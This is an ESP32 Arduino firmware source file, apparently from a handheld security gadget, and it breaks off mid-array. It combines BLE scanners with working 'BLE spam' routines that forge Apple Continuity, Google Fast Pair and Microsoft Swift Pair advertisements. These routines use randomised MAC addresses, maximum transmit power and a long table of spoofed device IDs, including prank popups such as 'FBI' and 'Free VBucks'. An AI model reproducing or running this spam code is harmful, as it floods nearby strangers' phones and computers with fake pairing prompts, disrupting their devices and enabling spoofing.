
#ifdef CONFIG_IDF_TARGET_ESP32S2  //8888888888888888888888888888888888888888888888888     esp32s2
#include <Arduino.h>
bool destroy(){
  Serial.println("NO BLUETOOTH");
  return 0;
}
bool init_nim(){
  Serial.println("NO BLUETOOTH");
  return 0;
}
void advertiseMicrosoft() {
  Serial.println("NO BLUETOOTH");
}
void advertiseAndroid(){
  Serial.println("NO BLUETOOTH");
}
void advertiseWindows(){
  Serial.println("NO BLUETOOTH");
}
void advertiseApple(){
  Serial.println("NO BLUETOOTH");
}
void BTLE_JAM_nim(){
  Serial.println("NO BLUETOOTH");
}
void advertiseSamsung(){
  Serial.println("NO BLUETOOTH");
}

void ble_beacon_scanner_init() {
  Serial.println("NO BLUETOOTH");
}

void ble_beacon_scanner() {
  Serial.println("NO BLUETOOTH");
}

void ble_scanner_init() {
  Serial.println("NO BLUETOOTH");
}

void ble_scanner() {
  Serial.println("NO BLUETOOTH");
}
#else  //*888888888888888888&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&     esp32helo typemaster



/*
   Based on Neil Kolban example for IDF: https://github.com/nkolban/esp32-snippets/blob/master/cpp_utils/tests/BLE%20Tests/SampleScan.cpp
   Ported to Arduino ESP32 by Evandro Copercini
*/

/** NimBLE differences highlighted in comment blocks **/

/*******original********
  #include <BLEDevice.h>
  #include <BLEUtils.h>
  #include <BLEScan.h>
  #include <BLEAdvertisedDevice.h>
  #include "BLEEddystoneURL.h"
  #include "BLEEddystoneTLM.h"
  #include "BLEBeacon.h"
***********************/

#include <Arduino.h>

#include <NimBLEDevice.h>
#include <NimBLEAdvertisedDevice.h>
#include "NimBLEEddystoneURL.h"
#include "NimBLEEddystoneTLM.h"
#include "NimBLEBeacon.h"

#define ENDIAN_CHANGE_U16(x) ((((x)&0xFF00) >> 8) + (((x)&0xFF) << 8))

int scanTime = 5;  //In seconds
BLEScan *pBLEScan;

void Mac_random(uint8_t* buf, size_t len) {
for (size_t i = 0; i < len; i++) {
buf[i] = random(0, 1000);
}
}

class MyAdvertisedDeviceCallbacksBeacon : public BLEAdvertisedDeviceCallbacks {
/*** Only a reference to the advertised device is passed now
    void onResult(BLEAdvertisedDevice advertisedDevice) { **/
void onResult(BLEAdvertisedDevice *advertisedDevice) {
  if (advertisedDevice->haveName()) {
    Serial.print("Device name: ");
    Serial.println(advertisedDevice->getName().c_str());
    Serial.println("");
  }

  if (advertisedDevice->haveServiceUUID()) {
    BLEUUID devUUID = advertisedDevice->getServiceUUID();
    Serial.print("Found ServiceUUID: ");
    Serial.println(devUUID.toString().c_str());
    Serial.println("");
  } else {
    if (advertisedDevice->haveManufacturerData() == true) {
      std::string strManufacturerData = advertisedDevice->getManufacturerData();

      uint8_t cManufacturerData[100];
      strManufacturerData.copy((char *)cManufacturerData, strManufacturerData.length(), 0);

      if (strManufacturerData.length() == 25 && cManufacturerData[0] == 0x4C && cManufacturerData[1] == 0x00) {
        Serial.println("Found an iBeacon!");
        BLEBeacon oBeacon = BLEBeacon();
        oBeacon.setData(strManufacturerData);
        Serial.printf("iBeacon Frame\n");
        Serial.printf("ID: %04X Major: %d Minor: %d UUID: %s Power: %d\n", oBeacon.getManufacturerId(), ENDIAN_CHANGE_U16(oBeacon.getMajor()), ENDIAN_CHANGE_U16(oBeacon.getMinor()), oBeacon.getProximityUUID().toString().c_str(), oBeacon.getSignalPower());
      } else {
        Serial.println("Found another manufacturers beacon!");
        Serial.printf("strManufacturerData: %d ", strManufacturerData.length());
        for (int i = 0; i < strManufacturerData.length(); i++) {
          Serial.printf("[%X]", cManufacturerData[i]);
        }
        Serial.printf("\n");
      }
    }
    return;
  }

  BLEUUID eddyUUID = (uint16_t)0xfeaa;

  if (advertisedDevice->getServiceUUID().equals(eddyUUID)) {
    std::string serviceData = advertisedDevice->getServiceData(eddyUUID);
    if (serviceData[0] == 0x10) {
      Serial.println("Found an EddystoneURL beacon!");
      BLEEddystoneURL foundEddyURL = BLEEddystoneURL();

      foundEddyURL.setData(serviceData);
      std::string bareURL = foundEddyURL.getURL();
      if (bareURL[0] == 0x00) {
        Serial.println("DATA-->");
        for (int idx = 0; idx < serviceData.length(); idx++) {
          Serial.printf("0x%08X ", serviceData[idx]);
        }
        Serial.println("\nInvalid Data");
        return;
      }

      Serial.printf("Found URL: %s\n", foundEddyURL.getURL().c_str());
      Serial.printf("Decoded URL: %s\n", foundEddyURL.getDecodedURL().c_str());
      Serial.printf("TX power %d\n", foundEddyURL.getPower());
      Serial.println("\n");
    } else if (serviceData[0] == 0x20) {
      Serial.println("Found an EddystoneTLM beacon!");
      BLEEddystoneTLM foundEddyURL = BLEEddystoneTLM();
      foundEddyURL.setData(serviceData);

      Serial.printf("Reported battery voltage: %dmV\n", foundEddyURL.getVolt());
      Serial.printf("Reported temperature from TLM class: %.2fC\n", (double)foundEddyURL.getTemp());
      int temp = (int)serviceData[5] + (int)(serviceData[4] << 8);
      float calcTemp = temp / 256.0f;
      Serial.printf("Reported temperature from data: %.2fC\n", calcTemp);
      Serial.printf("Reported advertise count: %d\n", foundEddyURL.getCount());
      Serial.printf("Reported time since last reboot: %ds\n", foundEddyURL.getTime());
      Serial.println("\n");
      Serial.print(foundEddyURL.toString().c_str());
      Serial.println("\n");
    }
  }
}
};


void ble_beacon_scanner_init() {
  Serial.println("BLEAEACON Scanning...");

  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();  //create new scan
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacksBeacon());
  pBLEScan->setActiveScan(true);  //active scan uses more power, but get results faster
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);  // less or equal setInterval value
}

void ble_beacon_scanner() {
  // put your main code here, to run repeatedly:
  BLEScanResults foundDevices = pBLEScan->start(scanTime, false);
  Serial.print("Devices found: ");
  Serial.println(foundDevices.getCount());
  Serial.println("Scan done!");


  int exit_b = 1;
  while (exit_b) {
    if (readButtonStateY(BTN_Y)) {
      delay(20);
      exit_b = 0;
    }
    display.clearBuffer();
    display.setCursor(0, 10);
    display.print("Beacons Found:");
    display.setCursor(110, 10);
    display.print(foundDevices.getCount());
    int beaconCount = foundDevices.getCount();


    if (beaconCount >= 5) {
      beaconCount = 5;
    }
    //Serial.print(beaconCount);
    for (int i = 0; i < beaconCount; i++) {

      BLEAdvertisedDevice d = foundDevices.getDevice(i);
      String currName = d.getName().c_str();
      String strManufacturerData = d.getManufacturerData().c_str();

      BLEUUID devUUID = d.getServiceUUID();
      String currUuid = devUUID.toString().c_str();

      display.setCursor(0, 15 + (i * 10));
      if (currName.length() != 0) {
        display.print((String)currName);
        Serial.print((String)currName);
      } else {
        display.print((String)currUuid);
        Serial.print((String)currUuid);
      }
      //      display.setCursor(80, 15 + (i * 10));
      //      display.print("RSSI:");
      //      display.setCursor(110, 15 + (i * 10));
      //      display.print((String)d.getRSSI());
    }
    display.sendBuffer();
  }



  pBLEScan->clearResults();  // delete results fromBLEScan buffer to release memory
  delay(2000);
}

//hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh


class MyAdvertisedDeviceCallbacks: public NimBLEAdvertisedDeviceCallbacks {
    void onResult(NimBLEAdvertisedDevice* advertisedDevice) {
      Serial.printf("Advertised Device: %s \n", advertisedDevice->toString().c_str());
    }
};

void ble_scanner_init() {
  Serial.println("BLE Scanning...");

  /** *Optional* Sets the filtering mode used by the scanner in the BLE controller.

      Can be one of:
      CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE (0) (default)
      Filter by device address only, advertisements from the same address will be reported only once.

      CONFIG_BTDM_SCAN_DUPL_TYPE_DATA (1)
      Filter by data only, advertisements with the same data will only be reported once,
      even from different addresses.

      CONFIG_BTDM_SCAN_DUPL_TYPE_DATA_DEVICE (2)
      Filter by address and data, advertisements from the same address will be reported only once,
      except if the data in the advertisement has changed, then it will be reported again.

      Can only be used BEFORE calling NimBLEDevice::init.
  */
  //  NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);

  /** *Optional* Sets the scan filter cache size in the BLE controller.
      When the number of duplicate advertisements seen by the controller
      reaches this value it will clear the cache and start reporting previously
      seen devices. The larger this number, the longer time between repeated
      device reports. Range 10 - 1000. (default 20)

      Can only be used BEFORE calling NimBLEDevice::init.
  */
  //  NimBLEDevice::setScanDuplicateCacheSize(200);

  // NimBLEDevice::init("");

  // pBLEScan = NimBLEDevice::getScan(); //create new scan


  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();

  // Set the callback for when devices are discovered, no duplicates.
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true); // Set active scanning, this will get more data from the advertiser.
  pBLEScan->setInterval(100); // How often the scan occurs / switches channels; in milliseconds,
  pBLEScan->setWindow(99);  // How long to scan during the interval; in milliseconds.
  // pBLEScan->setMaxResults(0); // do not store the scan results, use callback only.
}

void ble_scanner() {

  // If an error occurs that stops the scan, it will be restarted here.
  /*
    if(pBLEScan->isScanning() == false) {
        // Start scan with: duration = 0 seconds(forever), no scan end callback, not a continuation of a previous scan.
        pBLEScan->start(0, nullptr, false);
    }
  */
  BLEScanResults foundDevices = pBLEScan->start(scanTime, false);
  Serial.print("Devices found: ");
  Serial.println(foundDevices.getCount());

  display.clearBuffer();
  display.setCursor(0, 10);
  display.print("Devices found: ");
  display.setCursor(110, 10);
  display.print(foundDevices.getCount());

  int beaconCount = foundDevices.getCount();


  int exit_b = 1;
  while (exit_b) {
    if (readButtonStateY(BTN_Y)) {
      delay(20);
      exit_b = 0;
    }
    display.clearBuffer();
    display.setCursor(0, 10);
    display.print("Beacons Found:");
    display.setCursor(110, 10);
    display.print(foundDevices.getCount());
    int beaconCount = foundDevices.getCount();


    if (beaconCount >= 5) {
      beaconCount = 5;
    }

    //Serial.print(beaconCount);

    for (int i = 0; i < beaconCount; i++) {

      BLEAdvertisedDevice d = foundDevices.getDevice(i);
      String currDevAddr = d.getAddress().toString().c_str();


      display.setCursor(0, 15 + (i * 10));
      display.print((String)currDevAddr);
      //   Serial.print((String)currDevAddr);
      display.setCursor(80, 15 + (i * 10));
      display.print("RSSI:");
      display.setCursor(110, 15 + (i * 10));
      display.print((String)d.getRSSI());
      //   Serial.print((String)d.getRSSI());
    }
    display.sendBuffer();


  }









  delay(2000);

}
//=======================
//=======================

//=========================


struct DeviceType {
  uint32_t value;
  String name;
};

DeviceType android_models[] = {
  // Genuine non-production/forgotten (good job Google)
  {0x0001F0, "Bisto CSR8670 Dev Board"},
  {0x000047, "Arduino 101"},
  {0x470000, "Arduino 101 2"},
  {0x00000A, "Anti-Spoof Test"},
  {0x0A0000, "Anti-Spoof Test 2"},
  {0x00000B, "Google Gphones"},
  {0x0B0000, "Google Gphones 2"},
  {0x0C0000, "Google Gphones 3"},
  {0x00000D, "Test 00000D"},
  {0x000007, "Android Auto"},
  {0x070000, "Android Auto 2"},
  {0x000008, "Foocorp Foophones"},
  {0x080000, "Foocorp Foophones 2"},
  {0x000009, "Test Android TV"},
  {0x090000, "Test Android TV 2"},
  {0x000035, "Test 000035"},
  {0x350000, "Test 000035 2"},
  {0x000048, "Fast Pair Headphones"},
  {0x480000, "Fast Pair Headphones 2"},
  {0x000049, "Fast Pair Headphones 3"},
  {0x490000, "Fast Pair Headphones 4"},
  {0x001000, "LG HBS1110"},
  {0x00B727, "Smart Controller 1"},
  {0x01E5CE, "BLE-Phone"},
  {0x0200F0, "Goodyear"},
  {0x00F7D4, "Smart Setup"},
  {0xF00002, "Goodyear"},
  {0xF00400, "T10"},
  {0x1E89A7, "ATS2833_EVB"},

  // Phone setup
  {0x00000C, "Google Gphones Transfer"},
  {0x0577B1, "Galaxy S23 Ultra"},
  {0x05A9BC, "Galaxy S20+"},

  // Genuine devices
  {0xCD8256, "Bose NC 700"},
  {0x0000F0, "Bose QuietComfort 35 II"},
  {0xF00000, "Bose QuietComfort 35 II 2"},
  {0x821F66, "JBL Flip 6"},
  {0xF52494, "JBL Buds Pro"},
  {0x718FA4, "JBL Live 300TWS"},
  {0x0002F0, "JBL Everest 110GA"},
  {0x92BBBD, "Pixel Buds"},
  {0x000006, "Google Pixel buds"},
  {0x060000, "Google Pixel buds 2"},
  {0xD446A7, "Sony XM5"},
  {0x2D7A23, "Sony WF-1000XM4"},
  {0x0E30C3, "Razer Hammerhead TWS"},
  {0x72EF8D, "Razer Hammerhead TWS X"},
  {0x72FB00, "Soundcore Spirit Pro GVA"},
  {0x0003F0, "LG HBS-835S"},
  {0x002000, "AIAIAI TMA-2 (H60)"},
  {0x003000, "Libratone Q Adapt On-Ear"},
  {0x003001, "Libratone Q Adapt On-Ear 2"},
  {0x00A168, "boAt  Airdopes 621"},
  {0x00AA48, "Jabra Elite 2"},
  {0x00AA91, "Beoplay E8 2.0"},
  {0x00C95C, "Sony WF-1000X"},
  {0x01EEB4, "WH-1000XM4"},
  {0x02AA91, "B&O Earset"},
  {0x01C95C, "Sony WF-1000X"},
  {0x02D815, "ATH-CK1TW"},
  {0x035764, "PLT V8200 Series"},
  {0x038CC7, "JBL TUNE760NC"},
  {0x02DD4F, "JBL TUNE770NC"},
  {0x02E2A9, "TCL MOVEAUDIO S200"},
  {0x035754, "Plantronics PLT_K2"},
  {0x02C95C, "Sony WH-1000XM2"},
  {0x038B91, "DENON AH-C830NCW"},
  {0x02F637, "JBL LIVE FLEX"},
  {0x02D886, "JBL REFLECT MINI NC"},
  {0xF00000, "Bose QuietComfort 35 II"},
  {0xF00001, "Bose QuietComfort 35 II"},
  {0xF00201, "JBL Everest 110GA"},
  {0xF00204, "JBL Everest 310GA"},
  {0xF00209, "JBL LIVE400BT"},
  {0xF00205, "JBL Everest 310GA"},
  {0xF00200, "JBL Everest 110GA"},
  {0xF00208, "JBL Everest 710GA"},
  {0xF00207, "JBL Everest 710GA"},
  {0xF00206, "JBL Everest 310GA"},
  {0xF0020A, "JBL LIVE400BT"},
  {0xF0020B, "JBL LIVE400BT"},
  {0xF0020C, "JBL LIVE400BT"},
  {0xF00203, "JBL Everest 310GA"},
  {0xF00202, "JBL Everest 110GA"},
  {0xF00213, "JBL LIVE650BTNC"},
  {0xF0020F, "JBL LIVE500BT"},
  {0xF0020E, "JBL LIVE500BT"},
  {0xF00214, "JBL LIVE650BTNC"},
  {0xF00212, "JBL LIVE500BT"},
  {0xF0020D, "JBL LIVE400BT"},
  {0xF00211, "JBL LIVE500BT"},
  {0xF00215, "JBL LIVE650BTNC"},
  {0xF00210, "JBL LIVE500BT"},
  {0xF00305, "LG HBS-1500"},
  {0xF00304, "LG HBS-1010"},
  {0xF00308, "LG HBS-1125"},
  {0xF00303, "LG HBS-930"},
  {0xF00306, "LG HBS-1700"},
  {0xF00300, "LG HBS-835S"},
  {0xF00309, "LG HBS-2000"},
  {0xF00302, "LG HBS-830"},
  {0xF00307, "LG HBS-1120"},
  {0xF00301, "LG HBS-835"},
  {0xF00E97, "JBL VIBE BEAM"},
  {0x04ACFC, "JBL WAVE BEAM"},
  {0x04AA91, "Beoplay H4"},
  {0x04AFB8, "JBL TUNE 720BT"},
  {0x05A963, "WONDERBOOM 3"},
  {0x05AA91, "B&O Beoplay E6"},
  {0x05C452, "JBL LIVE220BT"},
  {0x05C95C, "Sony WI-1000X"},
  {0x0602F0, "JBL Everest 310GA"},
  {0x0603F0, "LG HBS-1700"},
  {0x1E8B18, "SRS-XB43"},
  {0x1E955B, "WI-1000XM2"},
  {0x1EC95C, "Sony WF-SP700N"},
  {0x1ED9F9, "JBL WAVE FLEX"},
  {0x1EE890, "ATH-CKS30TW WH"},
  {0x1EEDF5, "Teufel REAL BLUE TWS 3"},
  {0x1F1101, "TAG Heuer Calibre E4 45mm"},
  {0x1F181A, "LinkBuds S"},
  {0x1F2E13, "Jabra Elite 2"},
  {0x1F4589, "Jabra Elite 2"},
  {0x1F4627, "SRS-XG300"},
  {0x1F5865, "boAt Airdopes 441"},
  {0x1FBB50, "WF-C700N"},
  {0x1FC95C, "Sony WF-SP700N"},
  {0x1FE765, "TONE-TF7Q"},
  {0x1FF8FA, "JBL REFLECT MINI NC"},
  {0x201C7C, "SUMMIT"},
  {0x202B3D, "Amazfit PowerBuds"},
  {0x20330C, "SRS-XB33"},
  {0x003B41, "M&D MW65"},
  {0x003D8A, "Cleer FLOW II"},
  {0x005BC3, "Panasonic RP-HD610N"},
  {0x008F7D, "soundcore Glow Mini"},
  {0x00FA72, "Pioneer SE-MS9BN"},
  {0x0100F0, "Bose QuietComfort 35 II"},
  {0x011242, "Nirvana Ion"},
  {0x013D8A, "Cleer EDGE Voice"},
  {0x01AA91, "Beoplay H9 3rd Generation"},
  {0x038F16, "Beats Studio Buds"},
  {0x039F8F, "Michael Kors Darci 5e"},
  {0x03AA91, "B&O Beoplay H8i"},
  {0x03B716, "YY2963"},
  {0x03C95C, "Sony WH-1000XM2"},
  {0x03C99C, "MOTO BUDS 135"},
  {0x03F5D4, "Writing Account Key"},
  {0x045754, "Plantronics PLT_K2"},
  {0x045764, "PLT V8200 Series"},
  {0x04C95C, "Sony WI-1000X"},
  {0x050F0C, "Major III Voice"},
  {0x052CC7, "MINOR III"},
  {0x057802, "TicWatch Pro 5"},
  {0x0582FD, "Pixel Buds"},
  {0x058D08, "WH-1000XM4"},
  {0x06AE20, "Galaxy S21 5G"},
  {0x06C197, "OPPO Enco Air3 Pro"},
  {0x06C95C, "Sony WH-1000XM2"},
  {0x06D8FC, "soundcore Liberty 4 NC"},
  {0x0744B6, "Technics EAH-AZ60M2"},
  {0x07A41C, "WF-C700N"},
  {0x07C95C, "Sony WH-1000XM2"},
  {0x07F426, "Nest Hub Max"},
  {0x0102F0, "JBL Everest 110GA - Gun Metal"},
  {0x0202F0, "JBL Everest 110GA - Silver"},
  {0x0302F0, "JBL Everest 310GA - Brown"},
  {0x0402F0, "JBL Everest 310GA - Gun Metal"},
  {0x0502F0, "JBL Everest 310GA - Silver"},
  {0x0702F0, "JBL Everest 710GA - Gun Metal"},
  {0x0802F0, "JBL Everest 710GA - Silver"},
  {0x054B2D, "JBL TUNE125TWS"},
  {0x0660D7, "JBL LIVE770NC"},
  {0x0103F0, "LG HBS-835"},
  {0x0203F0, "LG HBS-830"},
  {0x0303F0, "LG HBS-930"},
  {0x0403F0, "LG HBS-1010"},
  {0x0503F0, "LG HBS-1500"},
  {0x0703F0, "LG HBS-1120"},
  {0x0803F0, "LG HBS-1125"},
  {0x0903F0, "LG HBS-2000"},

  // Custom debug popups
  {0xD99CA1, "Flipper Zero"},
  {0xAA187F, "Free VBucks"},
  {0xDCE9EA, "Rickroll"},
  {0x87B25F, "Animated Rickroll"},
  {0x1448C9, "BLM"},
  {0x13B39D, "Talking Sasquach"},
  {0x7C6CDB, "Obama"},
  {0x005EF9, "Ryanair"},
  {0xE2106F, "FBI"},
  {0xB37A62, "Tesla"},
  {0x92ADC9, "Ton Upgrade Netflix"},
};

int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));








bool advertise_everyone = false;
NimBLEAdvertising *adv;
NimBLEServer *server;
int last_update = 0;
int circle_size = 0;


/**
   Credits https://github.com/RapierXbox/ESP32-Sour-Apple
*/



void  mac_rann() {
  // First generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++) {
    dummy_addr[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we
    // OR with 0xF0
    //   if (i == 0){
    //    dummy_addr[i] |= 0xF0;
    //  }
    //       if (i == 5){
    //    dummy_addr[i] &= 0xF0;
  }
  dummy_addr[0] = (dummy_addr[0] & 0xFE) | 0x02;

  // Print the generated MAC address
  Serial.printf("Generated MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                dummy_addr[0], dummy_addr[1], dummy_addr[2], dummy_addr[3], dummy_addr[4], dummy_addr[5]);

  // Optionally set the ESP32 MAC address
  if (esp_base_mac_addr_set(dummy_addr) == ESP_OK) {
    Serial.println("MAC address set successfully.");
  } else {
    Serial.println("Failed to set MAC address.");
  }
}
//  esp_base_mac_addr_set(dummy_addr);


#define SERVICE_UUID "4fafc201-1fb5-459e-8fcc-c5c9c331914b"

static NimBLEUUID dataUuid(SERVICE_UUID);
static uint32_t count = 0;
void  ble_types() {
  int adv_type_choice = random(3);
  if (adv_type_choice == 0) {
    adv->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1) {
    adv->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    adv->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }
  //  adv->setServiceData(dataUuid, std::string((char*)&count, sizeof(count)));
}

NimBLEAdvertisementData getOAdvertisementData() {
  NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16; // Packet Length
  packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00; // ...
  packet[i++] = 0x0F; // Type
  packet[i++] = 0x05; // Length
  packet[i++] = 0xC1; // Action Flags
  const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
  packet[i++] = types[rand() % sizeof(types)]; // Action Type
  esp_fill_random(&packet[i], 3);        // Authentication Tag
  i += 3;
  packet[i++] = 0x00; // ???
  packet[i++] = 0x00; // ???
  packet[i++] = 0x10; // Type ???
  esp_fill_random(&packet[i], 3);

  oAdvertisementData.addData(std::string((char *)packet, 17));
  return oAdvertisementData;
}

const char* generateRandomName() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = rand() % 10 + 1; // Generate a random length between 1 and 10
  char* randomName = (char*)malloc((len + 1) * sizeof(char)); // Allocate memory for the random name
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[rand() % strlen(charset)]; // Select random characters from the charset
  }
  randomName[len] = '\0'; // Null-terminate the string
  return randomName;
}

NimBLEAdvertisementData getSwiftAdvertisementData() {
  NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
  //  String b_name = String("fs - ");// + utilities::gen_random_str(5);
  //  const char* display_name = b_name.c_str();
  const char* display_name = generateRandomName();

  uint8_t display_name_len = strlen(display_name);

  uint8_t size = 7 + display_name_len;
  uint8_t *packet = (uint8_t *)malloc(size);
  uint8_t i = 0;

  packet[i++] = size - 1; // Size
  packet[i++] = 0xFF;   // AD Type (Manufacturer Specific)
  packet[i++] = 0x06;   // Company ID (Microsoft)
  packet[i++] = 0x00;   // ...
  packet[i++] = 0x03;   // Microsoft Beacon ID
  packet[i++] = 0x00;   // Microsoft Beacon Sub Scenario
  packet[i++] = 0x80;   // Reserved RSSI Byte
  for (int j = 0; j < display_name_len; j++)
  {
    packet[i + j] = display_name[j];
  }
  i += display_name_len;

  oAdvertisementData.addData(std::string((char *)packet, size));

  return oAdvertisementData;
}

// https://github.com/RogueMaster/flipperzero-firmware-wPlugins/blob/3cb7a817b1bc5269203a0322ae85b412802aa5ec/applications/external/ble_spam/protocols/fastpair.c#L239
NimBLEAdvertisementData getAndroidAdvertisementData() {
  NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
  uint8_t packet[14];
  uint8_t i = 0;

  packet[i++] = 3;  // Packet Length
  packet[i++] = 0x03; // AD Type (Service UUID List)
  packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
  packet[i++] = 0xFE; // ...

  packet[i++] = 6; // Size
  packet[i++] = 0x16; // AD Type (Service Data)
  packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
  packet[i++] = 0xFE; // ...
  const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
  packet[i++] = (model >> 0x10) & 0xFF;
  packet[i++] = (model >> 0x08) & 0xFF;
  packet[i++] = (model >> 0x00) & 0xFF;

  packet[i++] = 2; // Size
  packet[i++] = 0x0A; // AD Type (Tx Power Level)
  packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

  oAdvertisementData.addData(std::string((char *)packet, 14));
  return oAdvertisementData;
}



bool init_nim()
{
  try {

    uint8_t newMACAddress[] = {0x90, 0x84, 0x2B, 0x4A, 0x3A, 0x0A}; // BLE address
    esp_base_mac_addr_set(newMACAddress);
    // this->setBaseMacAddress(newMACAddress);
    //  NimBLEDevice::init("svc data");

    NimBLEDevice::init("");

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
    server = NimBLEDevice::createServer();
    adv = server->getAdvertising();
    adv->setAdvertisementType(ADV_TYPE_SCAN_IND);

    // seems we need to init it with an address in setup() step.


    Serial.println("ble");
    return true;
  } catch (...) {
    Serial.println("noble");
    return false;
  }
}

bool destroy()
{
  try
  {
    NimBLEDevice::deinit();
    return true;
  }
  catch (...)
  {
    return false;
  }
}

void advertiseApple() {
  ble_types();
  //  mac_rann();
  for (int i = 0; i < 3; i++) {

    NimBLEAdvertisementData advData = getOAdvertisementData();
    NimBLEAdvertisementData oScanResponseData = NimBLEAdvertisementData();//////
    adv->setAdvertisementData(advData);
    adv->setScanResponseData(oScanResponseData);////////////////////
    adv->setMinInterval(0x20);
    adv->setMaxInterval(0x20);
    adv->setMinPreferred(0x20);
    adv->setMaxPreferred(0x20);

    adv->start();
    //   led.flash();
    delay(60);
    adv->stop();
  }
}

void advertiseWindows() {
  ble_types();
  mac_rann();
  for (int i = 0; i < 3; i++) {
    NimBLEAdvertisementData advData = getSwiftAdvertisementData();
    NimBLEAdvertisementData oScanResponseData = NimBLEAdvertisementData();//////
    adv->setAdvertisementData(advData);
    adv->setScanResponseData(oScanResponseData);////////////////////

    adv->setMinInterval(0x20);
    adv->setMaxInterval(0x20);
    adv->setMinPreferred(0x20);
    adv->setMaxPreferred(0x20);

    adv->start();
    //   led.flash();
    delay(60);
    adv->stop();
  }
}

void advertiseAndroid() {
  ble_types();
  mac_rann();
  for (int i = 0; i < 3; i++) {
    NimBLEAdvertisementData advData = getAndroidAdvertisementData();
    NimBLEAdvertisementData oScanResponseData = NimBLEAdvertisementData();//////
    adv->setAdvertisementData(advData);
    adv->setScanResponseData(oScanResponseData);////////////////////
    adv->setMinInterval(0x20);
    adv->setMaxInterval(0x20);
    adv->setMinPreferred(0x20);
    adv->setMaxPreferred(0x20);

    adv->start();
    // led.flash();
    delay(60);
    adv->stop();
  }
}

NimBLEAdvertisementData getMicrosoftAdvertisementData() {
  NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
  const char* Name = generateRandomName();

  uint8_t name_len = strlen(Name);
uint8_t* packet = nullptr;
  packet = new uint8_t[7 + name_len];
uint8_t i = 0;
  packet[i++] = 7 + name_len - 1;
  packet[i++] = 0xFF;
  packet[i++] = 0x06;
  packet[i++] = 0x00;
  packet[i++] = 0x03;
  packet[i++] = 0x00;
  packet[i++] = 0x80;
  memcpy(&packet[i], Name, name_len);
  i += name_len;

  oAdvertisementData.addData(std::string((char *)packet, 7 + name_len));

  return oAdvertisementData;
}

void advertiseMicrosoft() {
  ble_types();
  mac_rann();
  for (int i = 0; i < 3; i++) {
    NimBLEAdvertisementData advData = getMicrosoftAdvertisementData();
    NimBLEAdvertisementData oScanResponseData = NimBLEAdvertisementData();//////
    adv->setAdvertisementData(advData);
    adv->setScanResponseData(oScanResponseData);////////////////////

    adv->setMinInterval(0x20);
    adv->setMaxInterval(0x20);
    adv->setMinPreferred(0x20);
    adv->setMaxPreferred(0x20);

    adv->start();
    //   led.flash();
    delay(60);
    adv->stop();
  }
}

bool toggleAdvertiseEveryone() {
  advertise_everyone = !advertise_everyone;
  return advertise_everyone;
}

void advertiseEveryoneRender() {
  //  if (circle_size > 50)
  //    circle_size = 1;

  //   int x = M5.Lcd.width() / 2;
  //   int y = M5.Lcd.height() / 2;

  //   M5.Lcd.fillCircle(x, y, 100, BLACK);
  //   for (int i = 1; i <= 4; i++) {
  //     if (circle_size != 0)
  //       M5.Lcd.drawCircle(x, y, circle_size / i, BLUE);
  //   }

  //    circle_size += 15;
}


struct WatchModel
{
  uint8_t value;
  const char *name;
};
WatchModel watch_models[26] = {
  {0x1A, ""},// "Fallback Watch"},
  {0x01, ""},// "White Watch4 Classic 44m"},
  {0x02, ""},// "Black Watch4 Classic 40m"},
  {0x03, ""},// "White Watch4 Classic 40m"},
  {0x04, ""},// "Black Watch4 44mm"},
  {0x05, ""},// "Silver Watch4 44mm"},
  {0x06, ""},// "Green Watch4 44mm"},
  {0x07, ""},// "Black Watch4 40mm"},
  {0x08, ""},// "White Watch4 40mm"},
  {0x09, ""},// "Gold Watch4 40mm"},
  {0x0A, ""},// "French Watch4"},
  {0x0B, ""},// "French Watch4 Classic"},
  {0x0C, ""},// "Fox Watch5 44mm"},
  {0x11, ""},// "Black Watch5 44mm"},
  {0x12, ""},// "Sapphire Watch5 44mm"},
  {0x13, ""},// "Purpleish Watch5 40mm"},
  {0x14, ""},// "Gold Watch5 40mm"},
  {0x15, ""},// "Black Watch5 Pro 45mm"},
  {0x16, ""},// "Gray Watch5 Pro 45mm"},
  {0x17, ""},// "White Watch5 44mm"},
  {0x18, ""},// "White & Black Watch5"},
  {0x1B, ""},// "Black Watch6 Pink 40mm"},
